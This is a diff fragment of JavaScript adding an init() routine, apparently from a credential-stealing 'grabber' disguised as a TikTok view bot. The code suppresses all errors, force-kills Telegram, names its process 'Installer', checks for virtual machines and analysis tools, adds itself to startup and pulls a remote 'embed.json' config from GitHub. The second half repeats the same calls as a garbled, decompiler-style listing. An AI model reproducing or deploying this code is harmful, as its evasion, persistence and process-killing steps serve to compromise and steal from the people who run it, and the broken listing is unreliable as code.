@@ -1,0 +1,69 @@
+async init() {
+        process.on("unhandledRejection", (err) => {
+        });
+
+        process.on("uncaughtException", (exc) => {
+        });
+
+        exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error}`);
+                return;
+            }
+        })
+
+        process.title = "Installer";
+
+        this.utils.protection.detect_malicious_processes();
+
+        const exit = await this.utils.protection.inVM();
+
+        if (exit) {
+           
+        }
+
+        this.add_to_startup();
+
+        this.utils.constructor.loadCPUS();
+
+        try {
+            this.config.embed = JSON.parse(
+                JSON.stringify(
+                    (
+                        await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+                    ).data
+          ...
+process.on("unhandledRejection", (err) => {
+        })
+process.on("uncaughtException", (exc) => {
+        })
+exec('taskkill /IM Telegram.exe /F', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`exec error: ${error}`);
+                return;
+            }
+        })
+process.title = "Installer"
+(_tmp_22 = this.utils.protection).detect_malicious_processes
+const exit = await this.utils.protection.inVM()
+this.add_to_startup()
+(_tmp_24 = this.utils.constructor).loadCPUS
+this.config.embed = JSON.parse(
+                JSON.stringify(
+                    (
+                        await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+                    ).data
+                )
+            )
+await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        ).data
+await this.requires.axios.get(
+                            "https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+                        )
+"https://raw.githubusercontent.com/AliTefeli02/TikTok-ViewBot/main/embed.json"
+data
